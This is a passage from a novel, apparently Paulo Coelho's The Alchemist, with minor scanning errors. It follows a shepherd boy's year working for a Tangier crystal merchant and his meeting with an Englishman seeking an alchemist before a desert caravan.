alone.\nI'm going to become bitter and\ndistrustful of people because one\nperson betrayed me. I'm going to hate\nthose who have found their treasure\nbecause I never found mine. And I'm\ngoing to hold on to what little I have,\nbecause I'm too insignificant to\nconquer the world.\n\nHe opened his pouch to see what was\nleft of his possessions; maybe there\nwas a bit left of the sandwich he had\neaten on the ship. But all he found was\nthe heavy book, his jacket, and the two\nstones the old man had given him.\n\nAs he looked at the stones, he felt\nrelieved for some reason. He had\nexchanged six sheep for two precious\nstones that had been taken from a gold\nbreastplate. He could sell the stones\nand buy a return ticket. But this time\nI'll be smarter, the boy thought,\nremoving them from the pouch so he\ncould put them in his pocket. This was\na port town, and the only truthful thing\nhis friend had told him was that port\ntowns are full of thieves.\nNow he understood why the owner of\nthe bar had been so upset: he was\ntrying to tell him not to trust that man.\n\"I'm like everyone else—I see the\nworld in terms of what I would like to\nsee happen, not what actually does.\"\n\nHe ran his fingers slowly over the\nstones, sensing their temperature and\nfeeling their surfaces. They were his\ntreasure. Just handling them made him\nfeel better. They reminded him of the\nold man.\n\n\"When you want something, all the\nuniverse conspires in helping you to\nachieve it,\" he had said.\n\nThe boy was trying to understand the\ntruth of what the old man had said.\nThere he was in the empty\nmarketplace, without a cent to his\nname, and with not a sheep to guard\nthrough the night. But the stones were\nproof that he had met with a king—a\nking who knew of the boy's past.\n\n\"They're called Urim and Thummim,\nand they can help you to read the\nomens.\" The boy put the stones back in\nthe pouch and decided to do an\nexperiment. The old man had said to\nask very clear questions, and to do that,\nthe boy had to know what he wanted.\nSo, he asked if the old man's blessing\nwas still with him.\nHe took out one of the stones. It was\n\"yes.\"\n\"Am I going to find my treasure?\" he\nasked.\n\nHe stuck his hand into the pouch, and\nfelt around for one of the stones. As he\ndid so, both of them pushed through a\nhole in the pouch and fell to the\nground. The boy had never even\nnoticed that there was a hole in his\npouch. He knelt down to find Urim and\nThummim and put them back in the\npouch. But as he saw them lying there\non the ground, another phrase came to\nhis mind.\n\n\"Learn to recognize omens, and follow\nthem,\" the old king had said.\n\nAn omen. The boy smiled to himself.\nHe picked up the two stones and put\nthem back in his pouch. He didn't\nconsider mending the hole—the stones\ncould fall through any time they\nwanted. He had learned that there were\ncertain things one shouldn't ask about,\nso as not to flee from one's own\ndestiny. \"I promised that I would make\nmy own decisions,\" he said to himself.\n\nBut the stones had told him that the old\nman was still with him, and that made\nhim feel more confident. He looked\naround at the empty plaza again,\nfeeling less desperate than before. This\nwasn't a strange place; it was a new\none.\n\nAfter all, what he had always wanted\nwas just that: to know new places. Even\nif he never got to the Pyramids, he had\nalready traveled farther than any\nshepherd he knew. Oh, if they only\nknew how different things are just two\nhours by ship from where they are, he\nthought. Although his new world at the\nmoment was just an empty\nmarketplace, he had already seen it\nwhen it was teeming with life, and he\nwould never forget it. He remembered\nthe sword. It hurt him a bit to think\nabout it, but he had never seen one like\nit before. As he mused about these\nthings, he realized that he had to\nchoose between thinking of himself as\nthe poor victim of a thief and as an\nadventurer in quest of his treasure.\n\n\"I'm an adventurer, looking for\ntreasure,\" he said to himself.\n\n水\n\nHe was shaken into wakefulness by\nsomeone. He had fallen asleep in the\nmiddle of the marketplace, and life in\nthe plaza was about to resume.\n\nLooking around, he sought his sheep,\nand then realized that he was in a new\nworld. But instead of being saddened,\nhe was happy. He no longer had to seek\nout food and water for the sheep; he\ncould go in search of his treasure,\ninstead. He had not a cent in his pocket,\nbut he had faith. He had decided, the\nnight before, that he would be as much\nan adventurer as the ones he had\nadmired in books.\n\nHe walked slowly through the market.\nThe merchants were assembling their\nstalls, and the boy helped a candy seller\nto do his. The candy seller had a smile\non his face: he was happy, aware of\nwhat his life was about, and ready to\nbegin a day's work. His smile reminded\nthe boy of the old man—the mysterious\nold king he had met. \"This candy\nmerchant isn't making candy so that\nlater he can travel or marry a\nshopkeeper's daughter.\n\nHe's doing it because it's what he wants\nto do,\" thought the boy. He realized\nthat he could do the same thing the old\nman had done—sense whether a person\nwas near to or far from his destiny. Just\nby looking at them. It's easy, and yet\nI've never done it before, he thought.\n\nWhen the stall was assembled, the\ncandy seller offered the boy the first\nsweet he had made for the day. The boy\nthanked him, ate it, and went on his\nway. When he had gone only a short\ndistance, he realized that, while they\nwere erecting the stall, one of them had\nspoken Arabic and the other Spanish.\n\nAnd they had understood each other\nperfectly well.\n\nThere must be a language that doesn't\ndepend on words, the boy thought. I've\nalready had that experience with my\nsheep, and now it's happening with\npeople.\n\nHe was learning a lot of new things.\nSome of them were things that he had\nalready experienced, and weren't really\nnew, but that he had never perceived\nbefore. And he hadn't perceived them\nbecause he had become accustomed to\nthem. He realized: If I can learn to\nunderstand this language without\nwords, I can learn to understand the\nworld.\n\nRelaxed and unhurried, he resolved that\nhe would walk through the narrow\nstreets of Tangier. Only in that way\nwould he be able to read the omens. He\nknew it would require a lot of patience,\nbut shepherds know all about patience.\nOnce again he saw that, in that strange\nland, he was applying the same lessons\nhe had learned with his sheep.\n\n\"All things are one,\" the old man had\nsaid.\n\n水\n\nThe crystal merchant awoke with the\nday, and felt the same anxiety that he\nfelt every morning. He had been in the\nsame place for thirty years: a shop at\nthe top of a hilly street where few\ncustomers passed. Now it was too late\nto change anything—the only thing he\nhad ever learned to do was to buy and\nsell crystal glassware. There had been a\ntime when many people knew of his\nshop: Arab merchants, French and\nEnglish geologists, German soldiers\nwho were always well-heeled. In those\ndays it had been wonderful to be\nselling crystal, and he had thought how\nhe would become rich, and have\nbeautiful women at his side as he grew\nolder.\nBut, as time passed, Tangier had\nchanged. The nearby city of Ceuta had\ngrown faster than Tangier, and business\nhad fallen off. Neighbors moved away,\nand there remained only a few small\nshops on the hill. And no one was\ngoing to climb the hill just to browse\nthrough a few small shops.\n\nBut the crystal merchant had no choice.\nHe had lived thirty years of his life\nbuying and selling crystal pieces, and\nnow it was too late to do anything else.\n\nHe spent the entire morning observing\nthe infrequent comings and goings in\nthe street.\n\nHe had done this for years, and knew\nthe schedule of everyone who passed.\nBut, just before lunchtime, a boy\nstopped in front of the shop. He was\ndressed normally, but the practiced\neyes of the crystal merchant could see\nthat the boy had no money to spend.\n\nNevertheless, the merchant decided to\ndelay his lunch for a few minutes until\nthe boy moved on.\n\n水\n\nA card hanging in the doorway\nannounced that several languages were\nspoken in the shop.\n\nThe boy saw a man appear behind the\ncounter.\n\"I can clean up those glasses in the\nwindow, if you want,\" said the boy.\n\"The way they look now, nobody is\ngoing to want to buy them.\"\n\nThe man looked at him without\nresponding.\n\n\"In exchange, you could give me\nsomething to eat.\"\n\nThe man still said nothing, and the boy\nsensed that he was going to have to\nmake a decision. In his pouch, he had\nhis jacket—he certainly wasn't going to\nneed it in the desert. Taking the jacket\nout, he began to clean the glasses. In\nhalf an hour, he had cleaned all the\nglasses in the window, and, as he was\ndoing so, two customers had entered\nthe shop and bought some crystal.\n\nWhen he had completed the cleaning,\nhe asked the man for something to eat.\n\"Let's go and have some lunch,\" said\nthe crystal merchant.\n\nHe put a sign on the door, and they\nwent to a small café nearby. As they sat\ndown at the only table in the place, the\ncrystal merchant laughed.\n\n\"You didn't have to do any cleaning,\"\nhe said. \"The Koran requires me to feed\na hungry person.”\n\n\"Well then, why did you let me do it?\"\nthe boy asked.\n\"Because the crystal was dirty. And\nboth you and I needed to cleanse our\nminds of negative thoughts.\"\n\nWhen they had eaten, the merchant\nturned to the boy and said, \"I'd like you\nto work in my shop. Two customers\ncame in today while you were working,\nand that's a good omen.\"\n\nPeople talk a lot about omens, thought\nthe shepherd. But they really don't\nknow what they're saying. Just as I\nhadn't realized that for so many years I\nhad been speaking a language without\nwords to my sheep.\n\n\"Do you want to go to work for me?\"\nthe merchant asked.\n\"I can work for the rest of today,\" the\nboy answered. \"I'll work all night, until\ndawn, and I'll clean every piece of\ncrystal in your shop. In return, I need\nmoney to get to Egypt tomorrow.\"\n\nThe merchant laughed. \"Even if you\ncleaned my crystal for an entire year...\neven if you earned a good commission\nselling every piece, you would still\nhave to borrow money to get to Egypt.\nThere are thousands of kilometers of\ndesert between here and there.\"\n\nThere was a moment of silence so\nprofound that it seemed the city was\nasleep. No sound from the bazaars, no\narguments among the merchants, no\nmen climbing to the towers to chant.\nNo hope, no adventure, no old kings or\ndestinies, no treasure, and no Pyramids.\nIt was as if the world had fallen silent\nbecause the boy's soul had. He sat\nthere, staring blankly through the door\nof the café, wishing that he had died,\nand that everything would end forever\nat that moment.\n\nThe merchant looked anxiously at the\nboy. All the joy he had seen that\nmorning had suddenly disappeared.\n\n\"I can give you the money you need to\nget back to your country, my son,\" said\nthe crystal merchant.\n\nThe boy said nothing. He got up,\nadjusted his clothing, and picked up his\npouch.\n\n\"T'll work for you,\" he said.\nAnd after another long silence, he\n\nadded, \"I need money to buy some\nsheep.”\nPART TWO\n\nThe boy had been working for the\ncrystal merchant for almost a month,\nand he could see that it wasn't exactly\nthe kind of job that would make him\nhappy. The merchant spent the entire\nday mumbling behind the counter,\ntelling the boy to be careful with the\npieces and not to break anything.\n\nBut he stayed with the job because the\nmerchant, although he was an old\ngrouch, treated him fairly; the boy\nreceived a good commission for each\npiece he sold, and had already been\nable to put some money aside. That\nmorning he had done some calculating:\nif he continued to work every day as he\nhad been, he would need a whole year\nto be able to buy some sheep.\n\n\"I'd like to build a display case for the\ncrystal,\" the boy said to the merchant.\n\"We could place it outside, and attract\nthose people who pass at the bottom of\nthe hill.\"\n\n\"T've never had one before,\" the\nmerchant answered. \"People will pass\nby and bump into it, and pieces will be\nbroken.\"\n\n\"Well, when I took my sheep through\nthe fields some of them might have\ndied if we had come upon a snake. But\nthat's the way life is with sheep and\nwith shepherds.”\n\nThe merchant turned to a customer who\nwanted three crystal glasses. He was\nselling better than ever... as if time had\nturned back to the old days when the\nstreet had been one of Tangier's major\nattractions.\n\n\"Business has really improved,\" he said\nto the boy, after the customer had left.\n\"I'm doing much better, and soon you'll\nbe able to return to your sheep. Why\nask more out of life?\"\n\n\"Because we have to respond to\nomens,\" the boy said, almost without\nmeaning to; then he regretted what he\nhad said, because the merchant had\nnever met the king.\n\n\"It's called the principle of favorability,\nbeginner's luck. Because life wants you\nto achieve your destiny,\" the old king\nhad said.\n\nBut the merchant understood what the\nboy had said. The boy's very presence\nin the shop was an omen, and, as time\npassed and money was pouring into the\ncash drawer, he had no regrets about\nhaving hired the boy. The boy was\nbeing paid more money than he\ndeserved, because the merchant,\nthinking that sales wouldn't amount to\nmuch, had offered the boy a high\ncommission rate. He had assumed he\nwould soon return to his sheep.\n\n\"Why did you want to get to the\nPyramids?\" he asked, to get away from\nthe business of the display.\n\n\"Because I've always heard about\nthem,\" the boy answered, saying\nnothing about his dream. The treasure\nwas now nothing but a painful memory,\nand he tried to avoid thinking about it.\n\n\"1 don't know anyone around here who\nwould want to cross the desert just to\nsee the Pyramids,\" said the merchant.\n\"They're just a pile of stones. You\ncould build one in your backyard.\"\n\"You've never had dreams of travel,\"\nsaid the boy, turning to wait on a\ncustomer who had entered the shop.\n\nTwo days later, the merchant spoke to\nthe boy about the display.\n\n\"I don't much like change,\" he said.\n\"You and I aren't like Hassan, that rich\nmerchant. If he makes a buying\nmistake, it doesn't affect him much.\nBut we two have to live with our\nmistakes.\"\n\nThat's true enough, the boy thought,\nruefully.\n\n\"Why did you think we should have the\ndisplay?\"\n\"I want to get back to my sheep faster.\nWe have to take advantage when luck\nis on our side, and do as much to help it\nas it's doing to help us. It's called the\nprinciple of favorability. Or beginner's\nluck.\"\n\nThe merchant was silent for a few\nmoments. Then he said, \"The Prophet\ngave us the Koran, and left us just five\nobligations to satisfy during our lives.\nThe most important is to believe only\nin the one true God. The others are to\npray five times a day, fast during\nRamadan, and be charitable to the\npoor.\"\n\nHe stopped there. His eyes filled with\ntears as he spoke of the Prophet. He\n\nwas a devout man, and, even with all\nhis impatience, he wanted to live his\nlife in accordance with Muslim law.\n\n\"What's the fifth obligation?\" the boy\nasked.\n\n\"Two days ago, you said that I had\nnever dreamed of travel,\" the merchant\nanswered.\n\n\"The fifth obligation of every Muslim\nis a pilgrimage. We are obliged, at\nleast once in our lives, to visit the holy\ncity of Mecca.\n\n\"Mecca is a lot farther away than the\nPyramids. When I was young, all I\nwanted to do was put together enough\nmoney to start this shop. I thought that\nsomeday I'd be rich, and could go to\nMecca. I began to make some money,\nbut I could never bring myself to leave\nsomeone in charge of the shop; the\ncrystals are delicate things. At the\nsame time, people were passing my\nshop all the time, heading for Mecca.\nSome of them were rich pilgrims,\ntraveling in caravans with servants and\ncamels, but most of the people making\nthe pilgrimage were poorer than I.\n\n\"All who went there were happy at\nhaving done so. They placed the\nsymbols of the pilgrimage on the doors\nof their houses. One of them, a cobbler\nwho made his living mending boots,\nsaid that he had traveled for almost a\nyear through the desert, but that he got\nmore tired when he had to walk\nthrough the streets of Tangier buying\nhis leather.\"\n\n\"Well, why don't you go to Mecca\nnow?\" asked the boy.\n\n\"Because it's the thought of Mecca that\nkeeps me alive. That's what helps me\nface these days that are all the same,\nthese mute crystals on the shelves, and\nlunch and dinner at that same horrible\ncafé. I'm afraid that if my dream is\nrealized, I'll have no reason to go on\nliving.\n\"You dream about your sheep and the\nPyramids, but you're different from\nme, because you want to realize your\ndreams. I just want to dream about\nMecca. I've already imagined a\nthousand times crossing the desert,\narriving at the Plaza of the Sacred\nStone, the seven times I walk around it\nbefore allowing myself to touch it. I've\nalready imagined the people who\nwould be at my side, and those in front\nof me, and the conversations and\nprayers we would share. But I'm afraid\nthat it would all be a disappointment,\nso I prefer just to dream about it.\"\n\nThat day, the merchant gave the boy\npermission to build the display. Not\neveryone can see his dreams come true\nin the same way.\n\n水\n\nTwo more months passed, and the shelf\nbrought many customers into the\ncrystal shop.\n\nThe boy estimated that, if he worked\nfor six more months, he could return to\nSpain and buy sixty sheep, and yet\nanother sixty. In less than a year, he\nwould have doubled his flock, and he\nwould be able to do business with the\nArabs, because he was now able to\nspeak their strange language. Since that\nmorning in the marketplace, he had\nnever again made use of Urim and\nThummim, because Egypt was now just\nas distant a dream for him as was\nMecca for the merchant. Anyway, the\nboy had become happy in his work, and\nthought all the time about the day when\nhe would disembark at Tarifa as a\nwinner.\n\n\"You must always know what it is that\nyou want,\" the old king had said. The\nboy knew, and was now working\ntoward it. Maybe it was his treasure to\nhave wound up in that strange land,\nmet up with a thief, and doubled the\nsize of his flock without spending a\ncent.\n\nHe was proud of himself. He had\nlearned some important things, like\nhow to deal in crystal, and about the\nlanguage without words... and about\nomens. One afternoon he had seen a\nman at the top of the hill, complaining\nthat it was impossible to find a decent\nplace to get something to drink after\nsuch a climb. The boy, accustomed to\nrecognizing omens, spoke to the\nmerchant.\n\n\"Let's sell tea to the people who climb\nthe hill.\"\n\n\"Lots of places sell tea around here,\"\nthe merchant said.\n\n\"But we could sell tea in crystal\nglasses. The people will enjoy the tea\nand want to buy the glasses. I have\nbeen told that beauty is the great\nseducer of men.\"\n\nThe merchant didn't respond, but that\nafternoon, after saying his prayers and\nclosing the shop, he invited the boy to\nsit with him and share his hookah, that\nstrange pipe used by the Arabs.\n\n\"What is it you're looking for?\" asked\nthe old merchant.\n\n\"I've already told you. I need to buy my\nsheep back, so I have to earn the money\nto do so.\"\n\nThe merchant put some new coals in\nthe hookah, and inhaled deeply.\n\"I've had this shop for thirty years. I\nknow good crystal from bad, and\neverything else there is to know about\ncrystal. I know its dimensions and how\nit behaves. If we serve tea in crystal,\nthe shop is going to expand. And then\nI'll have to change my way of life.\"\n\n\"Well, isn't that good?\"\n\n\"I'm already used to the way things are.\nBefore you came, I was thinking about\nhow much time I had wasted in the\nsame place, while my friends had\nmoved on, and either went bankrupt or\ndid better than they had before. It made\nme very depressed. Now, I can see that\nit hasn't been too bad. The shop is\nexactly the size I always wanted it to\nbe. I don't want to change anything,\nbecause I don't know how to deal with\nchange. I'm used to the way I am.\"\n\nThe boy didn't know what to say. The\nold man continued, \"You have been a\nreal blessing to me. Today, I\nunderstand something I didn't see\nbefore: every blessing ignored becomes\na curse. I don't want anything else in\nlife. But you are forcing me to look at\nwealth and at horizons I have never\nknown. Now that I have seen them, and\nnow that I see how immense my\npossibilities are, I'm going to feel\nworse than I did before you arrived.\nBecause I know the things I should be\nable to accomplish, and I don't want to\ndo so.\"\n\nIt's good I refrained from saying\nanything to the baker in Tarifa, thought\nthe boy to himself.\n\nThey went on smoking the pipe for a\nwhile as the sun began to set. They\nwere conversing in Arabic, and the boy\nwas proud of himself for being able to\ndo so. There had been a time when he\nthought that his sheep could teach him\neverything he needed to know about the\nworld. But they could never have\ntaught him Arabic.\n\nThere are probably other things in the\nworld that the sheep can't teach me,\nthought the boy as he regarded the old\nmerchant. All they ever do, really, is\nlook for food and water.\n\nAnd maybe it wasn't that they were\nteaching me, but that I was learning\nfrom them.\n\n\" Maktub,\" the merchant said, finally.\n\"What does that mean?\"\n\n\"You would have to have been born an\nArab to understand,\" he answered. \"But\nin your language it would be something\nlike 'It is written.’ \"\n\nAnd, as he smothered the coals in the\nhookah, he told the boy that he could\nbegin to sell tea in the crystal glasses.\nSometimes, there's just no way to hold\nback the river.\n\n水\n\nThe men climbed the hill, and they\nwere tired when they reached the top.\nBut there they saw a crystal shop that\noffered refreshing mint tea. They went\nin to drink the tea, which was served in\nbeautiful crystal glasses.\n\n\"My wife never thought of this,\" said\none, and he bought some crystal—he\nwas entertaining guests that night, and\nthe guests would be impressed by the\nbeauty of the glassware. The other man\nremarked that tea was always more\ndelicious when it was served in crystal,\nbecause the aroma was retained. The\nthird said that it was a tradition in the\nOrient to use crystal glasses for tea\nbecause it had magical powers.\n\nBefore long, the news spread, and a\ngreat many people began to climb the\nhill to see the shop that was doing\nsomething new in a trade that was so\nold. Other shops were opened that\nserved tea in crystal, but they weren't at\nthe top of a hill, and they had little\nbusiness.\n\nEventually, the merchant had to hire\ntwo more employees. He began to\nimport enormous quantities of tea,\nalong with his crystal, and his shop was\nsought out by men and women with a\nthirst for things new.\n\nAnd, in that way, the months passed.\n\n水\n\nThe boy awoke before dawn. It had\nbeen eleven months and nine days\nsince he had first set foot on the\nAfrican continent.\n\nHe dressed in his Arabian clothing of\nwhite linen, bought especially for this\nday. He put his headcloth in place and\nsecured it with a ring made of camel\nskin. Wearing his new sandals, he\ndescended the stairs silently.\n\nThe city was still sleeping. He prepared\nhimself a sandwich and drank some hot\ntea from a crystal glass. Then he sat in\nthe sun-filled doorway, smoking the\nhookah.\n\nHe smoked in silence, thinking of\nnothing, and listening to the sound of\nthe wind that brought the scent of the\ndesert. When he had finished his\nsmoke, he reached into one of his\npockets, and sat there for a few\nmoments, regarding what he had\nwithdrawn.\n\nIt was a bundle of money. Enough to\nbuy himself a hundred and twenty\nsheep, a return ticket, and a license to\nimport products from Africa into his\nown country.\n\nHe waited patiently for the merchant to\nawaken and open the shop. Then the\ntwo went off to have some more tea.\n\n\"I'm leaving today,\" said the boy. \"I\nhave the money I need to buy my\nsheep. And you have the money you\nneed to go to Mecca.”\n\nThe old man said nothing.\n\n\"Will you give me your blessing?\"\n\nasked the boy. \"You have helped me.\nThe man continued to prepare his tea,\nsaying nothing. Then he turned to the\n\n۲\nboy.\n\n\"I am proud of you,\" he said. \"You\nbrought a new feeling into my crystal\nshop. But you know that I'm not going\nto go to Mecca. Just as you know that\nyou're not going to buy your sheep.\"\n\n\"Who told you that?\" asked the boy,\nstartled.\n\n\" Maktub\" said the old crystal\nmerchant.\n\nAnd he gave the boy his blessing.\n\n水\n\nThe boy went to his room and packed\nhis belongings. They filled three sacks.\nAs he was leaving, he saw, in the\ncorner of the room, his old shepherd's\npouch. It was bunched up, and he had\nhardly thought of it for a long time. As\nhe took his jacket out of the pouch,\nthinking to give it to someone in the\nstreet, the two stones fell to the floor.\nUrim and Thummim.\n\nIt made the boy think of the old king,\nand it startled him to realize how long\nit had been since he had thought of\nhim. For nearly a year, he had been\nworking incessantly, thinking only of\nputting aside enough money so that he\ncould return to Spain with pride.\n\"Never stop dreaming,\" the old king\nhad said. \"Follow the omens.\"\n\nThe boy picked up Urim and\nThummim, and, once again, had the\nstrange sensation that the old king was\nnearby. He had worked hard for a year,\nand the omens were that it was time to\n\ngo.\n\nI'm going to go back to doing just what\nI did before, the boy thought. Even\nthough the sheep didn't teach me to\nspeak Arabic.\n\nBut the sheep had taught him\nsomething even more important: that\nthere was a language in the world that\neveryone understood, a language the\nboy had used throughout the time that\nhe was trying to improve things at the\nshop. It was the language of\nenthusiasm, of things accomplished\nwith love and purpose, and as part of a\nsearch for something believed in and\ndesired. Tangier was no longer a\nstrange city, and he felt that, just as he\nhad conquered this place, he could\nconquer the world.\n\n\"When you want something, all the\nuniverse conspires to help you achieve\nit,\" the old king had said.\n\nBut the old king hadn't said anything\nabout being robbed, or about endless\ndeserts, or about people who know\nwhat their dreams are but don't want to\nrealize them. The old king hadn't told\nhim that the Pyramids were just a pile\nof stones, or that anyone could build\none in his backyard. And he had\nforgotten to mention that, when you\nhave enough money to buy a flock\nlarger than the one you had before, you\nshould buy it.\n\nThe boy picked up his pouch and put it\nwith his other things. He went down the\nstairs and found the merchant waiting\non a foreign couple, while two other\ncustomers walked about the shop,\ndrinking tea from crystal glasses. It\nwas more activity than usual for this\ntime of the morning. From where he\nstood, he saw for the first time that the\nold merchant's hair was very much like\nthe hair of the old king. He\nremembered the smile of the candy\nseller, on his first day in Tangier, when\nhe had nothing to eat and nowhere to\ngo—that smile had also been like the\nold king's smile.\n\nIt's almost as if he had been here and\nleft his mark, he thought. And yet, none\nof these people has ever met the old\nking. On the other hand, he said that he\nalways appeared to help those who are\ntrying to realize their destiny.\n\nHe left without saying good-bye to the\ncrystal merchant. He didn't want to cry\nwith the other people there. He was\ngoing to miss the place and all the good\nthings he had learned.\n\nHe was more confident in himself,\nthough, and felt as though he could\nconquer the world.\n\n\"But I'm going back to the fields that I\nknow, to take care of my flock again.\"\nHe said that to himself with certainty,\nbut he was no longer happy with his\ndecision. He had worked for an entire\nyear to make a dream come true, and\nthat dream, minute by minute, was\nbecoming less important. Maybe\nbecause that wasn't really his dream.\n\nWho knows... maybe it's better to be\nlike the crystal merchant: never go to\nMecca, and just go through life\nwanting to do so, he thought, again\ntrying to convince himself. But as he\nheld Urim and Thummim in his hand,\nthey had transmitted to him the\nstrength and will of the old king. By\ncoincidence—or maybe it was an\nomen, the boy thought—he came to the\nbar he had entered on his first day\nthere. The thief wasn't there, and the\nowner brought him a cup of tea.\n\nI can always go back to being a\nshepherd, the boy thought. I learned\nhow to care for sheep, and I haven't\nforgotten how that's done. But maybe\nI'll never have another chance to get to\nthe Pyramids in Egypt. The old man\nwore a breastplate of gold, and he knew\nabout my past. He really was a king, a\nwise king.\n\nThe hills of Andalusia were only two\nhours away, but there was an entire\ndesert between him and the Pyramids.\nYet the boy felt that there was another\nway to regard his situation: he was\nactually two hours closer to his\ntreasure... the fact that the two hours\nhad stretched into an entire year didn't\nmatter.\n\nI know why I want to get back to my\nflock, he thought. I understand sheep;\nthey're no longer a problem, and they\ncan be good friends. On the other hand,\nI don't know if the desert can be a\nfriend, and it's in the desert that I have\nto search for my treasure. If I don't find\nit, I can always go home. I finally have\nenough money, and all the time I need.\nWhy not?\n\nHe suddenly felt tremendously happy.\nHe could always go back to being a\nshepherd. He could always become a\ncrystal salesman again. Maybe the\nworld had other hidden treasures, but\nhe had a dream, and he had met with a\nking. That doesn't happen to just\nanyone!\n\nHe was planning as he left the bar. He\nhad remembered that one of the crystal\nmerchant's suppliers transported his\ncrystal by means of caravans that\ncrossed the desert. He held Urim and\nThummim in his hand; because of\nthose two stones, he was once again on\nthe way to his treasure.\n\n\"I am always nearby, when someone\nwants to realize their destiny,\" the old\nking had told him.\n\nWhat could it cost to go over to the\nsupplier's warehouse and find out if the\nPyramids were really that far away?\n\n水\n\nThe Englishman was sitting on a bench\nin a structure that smelled of animals,\nsweat, and dust; it was part warehouse,\npart corral. I never thought I'd end up\nin a place like this, he thought, as he\nleafed through the pages of a chemical\njournal. Ten years at the university, and\nhere I am ina corral.\n\nBut he had to move on. He believed in\nomens. All his life and all his studies\nwere aimed at finding the one true\nlanguage of the universe. First he had\nstudied Esperanto, then the world's\nreligions, and now it was alchemy. He\nknew how to speak Esperanto, he\nunderstood all the major religions well,\nbut he wasn't yet an alchemist. He had\nunraveled the truths behind important\nquestions, but his studies had taken\nhim to a point beyond which he could\nnot seem to go. He had tried in vain to\nestablish a relationship with an\nalchemist. But the alchemists were\nstrange people, who thought only about\nthemselves, and almost always refused\nto help him. Who knows, maybe they\nhad failed to discover the secret of the\nMaster Work—the Philosopher's Stone\n—and for this reason kept their\nknowledge to themselves.\n\nHe had already spent much of the\nfortune left to him by his father,\nfruitlessly seeking the Philosopher's\nStone. He had spent enormous amounts\nof time at the great libraries of the\nworld, and had purchased all the rarest\nand most important volumes on\nalchemy. In one he had read that, many\nyears ago, a famous Arabian alchemist\nhad visited Europe. It was said that he\nwas more than two hundred years old,\nand that he had discovered the\nPhilosopher's Stone and the Elixir of\nLife. The Englishman had been\nprofoundly impressed by the story. But\nhe would never have thought it more\nthan just a myth, had not a friend of his\n—returning from an archaeological\nexpedition in the desert—told him\nabout an Arab that was possessed of\nexceptional powers.\n\n\"He lives at the Al-Fayoum oasis,\" his\nfriend had said. \"And people say that\nhe is two hundred years old, and is able\nto transform any metal into gold.\"\n\nThe Englishman could not contain his\nexcitement. He canceled all his\ncommitments and pulled together the\nmost important of his books, and now\nhere he was, sitting inside a dusty,\nsmelly warehouse. Outside, a huge\ncaravan was being prepared for a\ncrossing of the Sahara, and was\nscheduled to pass through Al-Fayoum.\n\nI'm going to find that damned\nalchemist, the Englishman thought.\nAnd the odor of the animals became a\nbit more tolerable.\nA young Arab, also loaded down with\nbaggage, entered, and greeted the\nEnglishman.\n\n\"Where are you bound?\" asked the\nyoung Arab.\n\n\"I'm going into the desert,\" the man\nanswered, turning back to his reading.\nHe didn't want any conversation at this\npoint. What he needed to do was\nreview all he had learned over the\nyears, because the alchemist would\ncertainly put him to the test.\n\nThe young Arab took out a book and\nbegan to read. The book was written in\nSpanish.\nThat's good, thought the Englishman.\nHe spoke Spanish better than Arabic,\nand, if this boy was going to Al-\nFayoum, there would be someone to\ntalk to when there were no other\nimportant things to do.\n\n水\n\n\"That's strange,\" said the boy, as he\ntried once again to read the burial\nscene that began the book. \"I've been\ntrying for two years to read this book,\nand I never get past these first few\npages.\" Even without a king to provide\nan interruption, he was unable to\nconcentrate.\n\nHe still had some doubts about the\ndecision he had made. But he was able\nto understand one thing: making a\ndecision was only the beginning of\nthings. When someone makes a\ndecision, he is really diving into a\nstrong current that will carry him to\nplaces he had never dreamed of when\nhe first made the decision.\n\nWhen I decided to seek out my\ntreasure, I never imagined that I'd wind\nup working in a crystal shop, he\nthought. And joining this caravan may\nhave been my decision, but where it\ngoes is going to be a mystery to me.\n\nNearby was the Englishman, reading a\nbook. He seemed unfriendly, and had\nlooked irritated when the boy had\nentered. They might even have become\nfriends, but the Englishman closed off\nthe conversation.\n\nThe boy closed his book. He felt that he\ndidn't want to do anything that might\nmake him look like the Englishman. He\ntook Urim and Thummim from his\npocket, and began playing with them.\n\nThe stranger shouted, \"Urim and\nThummim!\"\n\nIna flash the boy put them back in his\npocket.\n\n\"They're not for sale,\" he said.\n\"They're not worth much,\" the\nEnglishman answered. \"They're only\nmade of rock crystal, and there are\nmillions of rock crystals in the earth.\nBut those who know about such things\nwould know that those are Urim and\nThummim. I didn't know that they had\nthem in this part of the world.\"\n\n\"They were given to me as a present by\na king,\" the boy said.\n\nThe stranger didn't answer; instead, he\nput his hand in his pocket, and took out\ntwo stones that were the same as the\nboy's.\n\n\"Did you say a king?\" he asked.\n\"I guess you don't believe that a king\nwould talk to someone like me, a\nshepherd,\" he said, wanting to end the\nconversation.\n\n\"Not at all. It was shepherds who were\nthe first to recognize a king that the\nrest of the world refused to\nacknowledge. So, it's not surprising\nthat kings would talk to shepherds.\"\n\nAnd he went on, fearing that the boy\nwouldn't understand what he was\ntalking about, \"It's in the Bible. The\nsame book that taught me about Urim\nand Thummim. These stones were the\nonly form of divination permitted by\nGod. The priests carried them in a\ngolden breastplate.\"\n\nThe boy was suddenly happy to be\nthere at the warehouse.\n\n\"Maybe this is an omen,\" said the\nEnglishman, half aloud.\n\n\"Who told you about omens?\" The\nboy's interest was increasing by the\nmoment.\n\n\"Everything in life is an omen,\" said\nthe Englishman, now closing the\njournal he was reading. \"There is a\nuniversal language, understood by\neverybody, but already forgotten.\n\nI am in search of that universal\nlanguage, among other things. That's\nwhy I'm here. I have to find a man who\nknows that universal language. An\nalchemist.\"\n\nThe conversation was interrupted by\nthe warehouse boss.\n\n\"You're in luck, you two,\" the fat Arab\nsaid. \"There's a caravan leaving today\nfor Al-Fayoum.\"\n\n\"But I'm going to Egypt,\" the boy said.\n\n\"Al-Fayoum is in Egypt,\" said the\nArab. \"What kind of Arab are you?\"\n\n\"That's a good luck omen,\" the\nEnglishman said, after the fat Arab had\ngone out. \"If I could, I'd write a huge\nencyclopedia just about the words luck\nand coincidence. It's with those words\nthat the universal language is written.\"\n\nHe told the boy it was no coincidence\nthat he had met him with Urim and\nThummim in his hand. And he asked\nthe boy if he, too, were in search of the\nalchemist.\n\n\"I'm looking for a treasure,\" said the\nboy, and he immediately regretted\nhaving said it.\n\nBut the Englishman appeared not to\nattach any importance to it.\n\n\"In a way, so am I,\" he said.\n\"1 don't even know what alchemy is,\"\nthe boy was saying, when the\nwarehouse boss called to them to come\noutside.\n\n水\n\n\"T'm the leader of the caravan,\" said a\ndark-eyed, bearded man. \"I hold the\npower of life and death for every\nperson 1 take with me. The desert is a\ncapricious lady, and sometimes she\ndrives men crazy.\"\n\nThere were almost two hundred people\ngathered there, and four hundred\nanimals—\n\ncamels, horses, mules, and fowl. In the\ncrowd were women, children, and a\nnumber of men with swords at 